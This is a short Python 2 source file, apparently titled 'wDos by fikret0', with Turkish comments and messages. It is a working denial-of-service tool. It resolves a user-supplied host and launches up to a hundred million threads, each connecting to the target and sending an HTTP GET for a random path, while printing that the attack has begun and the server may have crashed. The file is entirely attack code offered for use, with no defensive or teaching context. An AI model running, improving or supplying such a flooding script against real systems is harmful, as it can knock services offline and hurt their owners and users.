#wDos by fikret0

import random
import socket
import string
import sys
import threading
import time

# Argumanları al
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print "ERROR\n Kullanim: " + sys.argv[0] + " <Host adi> <Port> <Islem sayisi>"
    sys.exit(1)


try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print " ERROR\n Yazdigin seyin dogru olduguna emin ol."
    sys.exit(2)


thread_num = 0
thread_num_mutex = threading.Lock()



def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] Baglaniliyor..." 

    thread_num_mutex.release()



def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data



def attack():
    print_status()
    url_path = generate_url_path()


    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        dos.connect((ip, port))


        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
    except socket.error, e:
        print "\n [ Server cokmus olabilir. ]: " + str(e)
    finally:

        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print "[#] Saldiri basladi: " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)


all_threads = []
for i in xrange(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)


    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join() 
